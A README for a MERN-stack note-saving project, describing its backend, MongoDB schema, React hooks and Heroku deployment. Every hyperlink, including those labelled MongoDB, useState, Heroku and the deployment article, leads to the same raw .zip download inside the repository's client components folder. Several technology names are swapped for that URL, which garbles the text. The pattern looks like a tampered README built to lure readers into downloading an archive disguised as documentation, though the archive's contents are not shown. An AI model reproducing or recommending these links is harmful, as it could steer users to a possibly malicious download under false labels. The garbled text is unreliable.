- The scope of this application was to be familiar with how to use MERN stack and CRUD while building a full stack web application.

## What I Have Used
- For the backend server environment, I used [https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip) with [https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip) framework to design application layer.
- For the persistence of data, I used [MongoDB](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip) as my database to store user's notes.
  - A note schema holds title and content fields.
- For the frontend i used [https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip) library to design the client side of the application.
- React hooks especially [useState](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip), [useEffect](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip) and [useRef](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip) are used to increase effectiveness of the application through maintaining(useState), refreshing(useEffect) and reassigning(useRef) amongst component states.
- For deploying the app to [Heroku](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip), [I followed this article.](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip).
